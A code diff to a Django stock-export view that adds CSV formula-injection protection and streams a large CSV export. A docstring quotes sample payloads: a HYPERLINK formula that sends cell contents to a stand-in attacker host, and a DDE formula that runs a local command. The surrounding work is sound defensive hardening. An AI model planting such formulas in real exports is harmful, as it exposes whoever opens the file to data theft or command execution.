@@ -21,14 +21,14 @@ inline here.
 import csv
 import datetime
 import decimal
-import io
 import itertools
 from dataclasses import dataclass
 from decimal import Decimal
 from typing import Callable, Optional
 
 from django.db import transaction
-from django.http import HttpResponse
+from django.utils import timezone
+from django.http import StreamingHttpResponse
 from rest_framework.decorators import api_view, permission_classes, throttle_classes
 from rest_framework.response import Response
 
@@ -99,6 +99,77 @@ def _serialize(value):
     if isinstance(value, Decimal):
         return float(value)
     return value
+
+
+# Characters that make Excel/LibreOffice/Sheets treat a CSV cell as a FORMULA
+# rather than text. Tab and carriage return are included because Excel strips
+# leading whitespace before deciding, so "\t=cmd|..." is still a formula to it.
+_CSV_FORMULA_PREFIXES = ("=", "+", "-", "@", "\t", "\r")
+
+
+def csv_safe(value):
+    """Neutralize CSV formula injection (CWE-1236) for one exported cell.
+
+    Added 2026-09-15 (audit pass). Every text column in this app's exports -
+    material description, category, vendor name - originates in a Google Drive
+    spreadsheet that plant staff edit by hand, and is written to the CSV
+    verbatim. A cell whose text begins `=`, `+`, `-` or `@` is executed as a
+    formula the moment the downloaded file is opened, so a value like
+    `=HYPERLINK("http://attacker/"&A1,"Click")` exfiltrates neighbouring cells
+    on click, and the legacy DDE form (`=cmd|'/c calc'!A0`) can prompt to run a
+    local command outright. The data source is explicitly a shared,
+    externally-editable set of spreadsheets and the whole point of this export
+    is to be reopened in Excel, so this is a live path, not a theoretical one.
+
+    The fix is the standard one: prefix a single quote, which Excel consumes as
+    "treat the rest as literal text" on open. Deliberately NOT stripping or
+    rejecting the character - a material genuinely named "-40C GRADE" must still
+    export with its leading hyphen intact and readable.
+
+    Non-string values (Decimal, date, int, bool, None) are returned untouched:
+    csv.writer renders them itself and none can carry a leading formula
+    character. That matters for correctness, not just tidiness - quoting a
+    numeric column would turn every quantity in the export into text that
+    Excel will not sum."""
+    if isinstance(value, str) and value.startswith(_CSV_FORMULA_PREFIXES):
+        return "'" + value
+    return value
+
+
+class _Echo:
+    """A file-like object that returns what it is asked to write instead of
+    storing it - the standard Django pattern for streaming a CSV
+    (docs: "Streaming large CSV files"). csv.writer needs something with a
+    .write(); handing it this makes writerow() RETURN the rendered line, which
+    the generator then yields straight to the client. Nothing accumulates."""
+
+    def write(self, value):
+        return value
+
+
+class SafeCsvWriter:
+    """csv.writer wrapper that runs every cell through csv_safe() on the way
+    out.
+
+    Deliberately a wrapper rather than a `[csv_safe(v) for v in row]` at each
+    call site: the export below writes 15 columns today and will grow, and a
+    guard you have to remember to apply per column is one that eventually gets
+    forgotten on exactly the column that needed it. Wrapping the writer makes
+    the safe path the only path - a new column is protected by construction.
+    Use this instead of csv.writer() for ANY new export."""
+
+    def __init__(self, fileobj):
+        self._writer = csv.writer(fileobj)
+
+    def writerow(self, row):
+        # Returns whatever the underlying file-like object's write() returned.
+        # For a real buffer that is a character count (ignored); for _Echo it
+        # is the rendered CSV line itself, which is what makes streaming work.
+        return self._writer.writerow([csv_safe(v) for v in row])
+
+    def writerows(self, rows):
+        for row in rows:
+            self.writerow(row)
 
 
 def _coerce_value(field_name, raw_value):
@@ -619,7 +690,7 @@ def _consumption_by_lot(cfg: _PlantConfig):
     concatenation is enough; an overlapping date between a real snapshot and
     a reconstructed point just costs one wasted interval (gap=0, skipped),
     not a correctness problem."""
-    window_start = datetime.date.today() - datetime.timedelta(days=DEFAULT_WINDOW_DAYS)
+    window_start = timezone.localdate() - datetime.timedelta(days=DEFAULT_WINDOW_DAYS)
     rows = (
         cfg.stock_snapshot_model.objects
         .filter(stock_lot__is_active=True, snapshot_date__gte=window_start)
@@ -866,35 +937,58 @@ def make_export_stock_snapshots(cfg: _PlantConfig):
         if to_date:
             qs = qs.filter(snapshot_date__lte=to_date)
 
-        buffer = io.StringIO()
-        writer = csv.writer(buffer)
-        writer.writerow([
-            "Plant", "Snapshot Date", "Material Description", "Material Code", "Category",
-            "Sub Category", "Vendor", "UOM", "Opening Stock", "Received", "Issued",
-            "Today's Stock", "Rate", "Value", "Lot Currently Active",
-        ])
-        for snap in qs.iterator(chunk_size=2000):
-            lot = snap.stock_lot
-            writer.writerow([
-                cfg.key.upper(),
-                snap.snapshot_date.isoformat(),
-                lot.description,
-                getattr(lot, cfg.lot_code_field, "") or "",
-                getattr(lot, "category", "") or "",
-                getattr(lot, "sub_category", "") or "",
-                (getattr(lot, cfg.lot_vendor_field, "") or "") if cfg.lot_vendor_field else "",
-                getattr(lot, "uom", "") or "",
-                snap.opening_stock, snap.received, snap.issued, snap.todays_stock,
-                getattr(snap, cfg.lot_rate_field, None),
-                snap.value,
-                lot.is_active,
+        # Streamed row-by-row rather than assembled in a StringIO and returned
+        # as one body (2026-09-15, audit pass). The DB side was already
+        # careful - `.iterator(chunk_size=2000)` never holds the whole
+        # queryset - but every rendered row still accumulated in memory until
+        # the last one was written, so peak usage tracked the FULL export size.
+        # This table grows by one row per active lot per day, forever, across
+        # three plants: an unbounded "export everything" request (the default,
+        # since both date params are optional) is the one request in this app
+        # whose memory cost has no ceiling at all. On Render's starter
+        # instance that is an OOM that kills the worker for every other user,
+        # triggered by one person clicking Export.
+        #
+        # StreamingHttpResponse + a generator keeps peak memory at one row
+        # regardless of export size, and the browser starts receiving bytes
+        # immediately instead of after the whole file is built - which also
+        # keeps a large export from tripping gunicorn's 30s worker timeout.
+        #
+        # Trade-off, accepted deliberately: a streamed response carries no
+        # Content-Length, so browsers show an indeterminate progress bar. Also
+        # note an exception raised mid-stream cannot become a 500 - headers are
+        # already sent - so this generator must not do anything that can fail
+        # in a new way; it only formats rows the queryset already yielded.
+        def _rows():
+            echo = _Echo()
+            writer = SafeCsvWriter(echo)
+            yield writer.writerow([
+                "Plant", "Snapshot Date", "Material Description", "Material Code", "Category",
+                "Sub Category", "Vendor", "UOM", "Opening Stock", "Received", "Issued",
+                "Today's Stock", "Rate", "Value", "Lot Currently Active",
             ])
+            for snap in qs.iterator(chunk_size=2000):
+                lot = snap.stock_lot
+                yield writer.writerow([
+                    cfg.key.upper(),
+                    snap.snapshot_date.isoformat(),
+                    lot.description,
+                    getattr(lot, cfg.lot_code_field, "") or "",
+                    getattr(lot, "category", "") or "",
+                    getattr(lot, "sub_category", "") or "",
+                    (getattr(lot, cfg.lot_vendor_field, "") or "") if cfg.lot_vendor_field else "",
+                    getattr(lot, "uom", "") or "",
+                    snap.opening_stock, snap.received, snap.issued, snap.todays_stock,
+                    getattr(snap, cfg.lot_rate_field, None),
+                    snap.value,
+                    lot.is_active,
+                ])
 
         filename = f"{cfg.key}_rm_stock_snapshots"
         if from_date or to_date:
             filename += f"_{from_date.isoformat() if from_date else 'start'}_to_{to_date.isoformat() if to_date else 'latest'}"
         filename += ".csv"
-        response = HttpResponse(buffer.getvalue(), content_type="text/csv")
+        response = StreamingHttpResponse(_rows(), content_type="text/csv")
         response["Content-Disposition"] = f'attachment; filename="{filename}"'
         return response
 
